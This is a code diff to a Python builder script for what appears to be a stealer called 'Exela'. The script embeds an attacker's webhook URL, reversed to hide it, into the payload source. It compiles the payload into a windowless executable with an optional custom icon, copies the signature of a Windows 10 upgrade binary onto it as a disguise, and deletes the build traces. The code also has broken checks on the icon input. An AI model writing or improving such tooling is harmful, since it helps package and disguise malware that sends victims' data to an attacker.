@@ -1,6 +1,26 @@
-import os, shutil
+import os, shutil, time
 
 webhook = str(input("enter your webhook url : "))
+try:
+    os.system("cls")
+except:
+    try:
+        os.system("clear")
+    except:
+        pass
+iconchange = False
+icon = str(input("Yes/no\nDo u want to change icon : "))
+iconpath = ""
+if icon.lower() == "yes" or icon.lower("y"):
+    iconchange = True
+    iconpath = str(input("icon file must be .ico otherwise the icon will not change\nEnter the path of the icon file : "))
+    if not iconpath.endswith(".icon"):
+        print("Pls use .ico files")
+        time.sleep(2)
+        exit()
+else:
+    pass
+
 with open("Exela.py", "r", encoding="utf-8", errors="ignore") as sourceCode:
     rip = sourceCode.read()
     replacedCode = rip.replace('%REPLACE_ME_FOR_QUiCADXD%', webhook[::-1])
@@ -27,7 +47,12 @@ def installModules():
 
 def buildFile():
     print("Building Your File pls wait.")
-    os.system("pyinstaller --onefile --noconsole --clean stub.py")
+    pyinstallerCommand = "pyinstaller --onefile --noconsole --clean "
+    if iconchange == True:
+        pyinstallerCommand += f"--icon={iconpath} stub.py"
+    else:
+        pyinstallerCommand += "stub.py"
+    os.system(pyinstallerCommand)
     print("File build was succesfully")
     print("Signing file pls wait")
     digitalSign("Windows10Upgrade9252.exe", os.getcwd() + "\\Dist\\stub.exe")
@@ -35,13 +60,15 @@ def buildFile():
     try:
         shutil.rmtree("build")
         os.remove('stub.spec')
+        os.remove("stub.py")
         shutil.rmtree("dist")
     except:
         pass # sex
-      
+  
     os.system("cls")
     print("your file build succesfully\nYour file is => Exela.exe")
-    
+    time.sleep(2)
+    exit()
 def digitalSign(path, signedFile):
     os.system(f"python digital-sign.py -i {path} -t {signedFile} -o Exela.exe")
 
